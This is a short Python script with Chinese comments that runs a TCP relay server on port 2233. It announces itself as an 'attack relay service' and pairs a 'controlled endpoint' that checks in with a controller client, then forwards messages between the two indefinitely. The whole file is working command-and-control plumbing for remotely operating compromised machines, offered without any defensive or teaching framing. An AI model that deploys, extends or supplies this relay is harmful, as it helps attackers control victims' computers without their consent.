import time

import socket
#声明主机
host = ""
#声明端口号
port = 2233
#创建sock套接字
sock = socket.socket()
#绑定主机和端口
sock.bind((host, port))
#开始监听
sock.listen(5)
#对话循环

print("攻击转发服务启动！")
all_time = ""

while True:
	try:
		#堵塞连接
		cli, addr = sock.accept()
		print("\n\n客户端接入！")
		print(addr)

		#接收模式识别
		mod = cli.recv(2048).decode()

		#模式为验证更新
		if mod == "hello":
			cli.sendall("stop".encode())
			print("被控端接入！")
			print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))

			all_time = str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
			
		if mod == "hi":
			cli.sendall(all_time.encode())
			
			cli.recv(2048).decode()
			cli2, addr = sock.accept()
			cli2.sendall("被控端接入！".encode())
			cli2.recv(2048).decode()
			cli.sendall("被控端接入！".encode())

			while True:
				a = cli.recv(2048).decode()
				cli2.sendall(a.encode())
				time.sleep(3)
				b = cli2.recv(2048).decode()
				cli.sendall(b.encode())


	except:
		print("a")

